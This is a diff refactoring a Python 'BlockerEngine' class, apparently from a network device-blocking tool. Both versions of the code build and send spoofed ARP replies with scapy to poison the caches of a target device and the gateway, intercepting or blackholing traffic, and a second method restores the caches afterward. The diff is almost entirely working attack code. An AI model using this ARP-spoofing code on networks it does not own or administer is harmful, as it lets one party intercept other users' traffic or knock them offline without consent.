@@ -196,50 +196,50 @@ class BlockerEngine:
 
     def _send_poison_packets(self, target_ip: str, target_mac: str):
         """Sends precision Layer 2 spoofed ARP packets directly to Target and Router."""
-        if not SCAPY_AVAILABLE or not target_ip or not target_mac:
+        if not _load_scapy() or not target_ip or not target_mac:
             return
 
-        gateway_ip = AppConfig.GATEWAY_IP
+        gateway_ip  = AppConfig.GATEWAY_IP
         gateway_mac = AppConfig.GATEWAY_MAC
-        host_mac = AppConfig.HOST_MAC
-        iface = AppConfig.INTERFACE_NAME or None
+        host_mac    = AppConfig.HOST_MAC
+        iface       = AppConfig.INTERFACE_NAME or None
 
         if not gateway_ip or not host_mac or host_mac == "00:00:00:00:00:00":
             return
 
         try:
             # 1. Unicast to Target: Gateway IP is at Host MAC (Blackhole/Intercept)
-            pkt_target = Ether(dst=target_mac, src=host_mac) / ARP(
-                op=2, # ARP Reply
+            pkt_target = _scapy_Ether(dst=target_mac, src=host_mac) / _scapy_ARP(
+                op=2,
                 pdst=target_ip,
                 hwdst=target_mac,
                 psrc=gateway_ip,
                 hwsrc=host_mac
             )
-            
+
             # 2. Unicast to Gateway: Target IP is at Host MAC
             if gateway_mac and gateway_mac != "00:00:00:00:00:00":
-                pkt_gateway = Ether(dst=gateway_mac, src=host_mac) / ARP(
-                    op=2, # ARP Reply
+                pkt_gateway = _scapy_Ether(dst=gateway_mac, src=host_mac) / _scapy_ARP(
+                    op=2,
                     pdst=gateway_ip,
                     hwdst=gateway_mac,
                     psrc=target_ip,
                     hwsrc=host_mac
                 )
-                sendp(pkt_gateway, iface=iface, verbose=0)
+                _scapy_sendp(pkt_gateway, iface=iface, verbose=0)
 
-            sendp(pkt_target, iface=iface, verbose=0)
+            _scapy_sendp(pkt_target, iface=iface, verbose=0)
         except Exception:
             pass
 
     def _restore_arp(self, target_ip: str, target_mac: str):
         """Sends clean ARP packets to restore accurate routing in both Target and Router caches."""
-        if not SCAPY_AVAILABLE or not target_ip or not target_mac:
+        if not _load_scapy() or not target_ip or not target_mac:
             return
 
-        gateway_ip = AppConfig.GATEWAY_IP
+        gateway_ip  = AppConfig.GATEWAY_IP
         gateway_mac = AppConfig.GATEWAY_MAC
-        iface = AppConfig.INTERFACE_NAME or None
+        iface       = AppConfig.INTERFACE_NAME or None
 
         if not gateway_ip:
             return
@@ -247,25 +247,23 @@ class BlockerEngine:
         try:
             gw_hw = gateway_mac if (gateway_mac and gateway_mac != "00:00:00:00:00:00") else "ff:ff:ff:ff:ff:ff"
             for _ in range(5):
-                # Clean target device ARP cache
-                restore_target = Ether(dst=target_mac, src=gw_hw) / ARP(
+                restore_target = _scapy_Ether(dst=target_mac, src=gw_hw) / _scapy_ARP(
                     op=2,
                     pdst=target_ip,
                     hwdst=target_mac,
                     psrc=gateway_ip,
                     hwsrc=gw_hw
                 )
-                sendp(restore_target, iface=iface, verbose=0)
+                _scapy_sendp(restore_target, iface=iface, verbose=0)
 
-                # Clean gateway router ARP cache
-                restore_gw = Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) / ARP(
+                restore_gw = _scapy_Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) / _scapy_ARP(
                     op=2,
                     pdst=gateway_ip,
                     hwdst=gw_hw,
                     psrc=target_ip,
                     hwsrc=target_mac
                 )
-                sendp(restore_gw, iface=iface, verbose=0)
+                _scapy_sendp(restore_gw, iface=iface, verbose=0)
                 time.sleep(0.02)
         except Exception:
             pass
